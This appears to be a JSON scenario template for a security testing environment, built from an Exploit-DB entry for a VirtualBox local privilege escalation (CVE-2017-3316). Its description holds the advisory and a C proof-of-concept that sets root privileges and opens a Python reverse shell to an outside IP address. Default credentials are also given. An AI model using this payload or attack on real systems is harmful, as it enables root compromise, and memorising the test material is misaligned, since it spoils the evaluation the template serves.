@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41196",
+  "category": "",
+  "attack_technique": "",
+  "cwe": "",
+  "description": "Linux privilege escalation: Oracle VM VirtualBox < 5.0.32 / < 5.1.14 - Local Privilege Escalation (CVE-2017-3316)\n\nExploit source code (41196.txt):\n```\n== [ Overview ] ===\n\n    System affected: VirtualBox\n    Software-Version: prior to 5.0.32, prior to 5.1.14\n    User-Interaction: Required\n    Impact: A Man-In-The-Middle could infiltrate an\nExtension-Pack-Update to gain a root-shell\n\n=== [ Detailed description ] ===\n\nIn my research about update mechanism of open-source software I found\nvulnerabilities in Oracle's VirtualBox. It's possible to compromise a\nsystem behind a firewall by infiltrating the updates of Extension-Packs\nbecause of the following flaws:\n\n1.  The Extension-Pack is updated via HTTP instead of HTTPS. The\nExtension-Packs are not signed, so a Man-In-The-Middle could send his\nown Extension-Pack(with malicious code included) instead of the regular\nupdate to the target. The Code would be executed with user-permissions.\nI reported this bug to Oracle but I think someone else discovered and\nreported it before. This bug also affects VirtualBox prior to 5.0.32,\nprior to 5.1.14. I don't know the CVE.\n\n2.  CVE-2017-3316: There is a privilege escalation bug in the downloader\nof VirtualBox. Extension-Packs are tar-archives. Tar-archives can\npreserve permissions.  A Man-In-The-Middle could include an executable\nwith setuid-permissions to the Extension-Pack. If the victim downloads\nthe Ext-pack, it will be stored as owner root and without checking the\npermissions of the binaries. This bug affects VirtualBox prior to\n5.0.32, prior to 5.1.14\n\n=== [ Proof-Of-Concept ] ===\n\nThe executeable of the following code is placed in the\nExtension-Pack-Archive under linux.amd64/evil with setuid.\n\n/* evil.c(executable with the reverse-shell) */\n#include <unistd.h>\n\nint main()\n{\n        setuid(0);\n        execl(\"/usr/bin/python\",\"python\",\"-c\",\"import\nsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.12.32.15\\\",5000));os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"]);\",NULL);\n        return 0;\n}\n\nThe  VirtualBox-Sources are downloaded next and the following code has\nto be placed under src/VBox/ExtPacks/Evil/VBoxEvilMain.cpp:\n\n/* $Id: VBoxEvilMain.cpp $ */\n/** @file\n * Evil main module.\n */\n\n/*\n * Copyright (C) 2010-2016 Oracle Corporation\n *\n * Permission is hereby granted, free of charge, to any person\n * obtaining a copy of this software and associated documentation\n * files (the \"Software\"), to deal in the Software without\n * restriction, including without limitation the rights to use,\n * copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the\n * Software is furnished to do so, subject to the following\n * conditions:\n *\n * The above copyright notice and this permission notice shall be\n * included in all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AN\n```",
+  "cve": "CVE-2017-3316",
+  "exploitdb_id": "41196",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41196",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
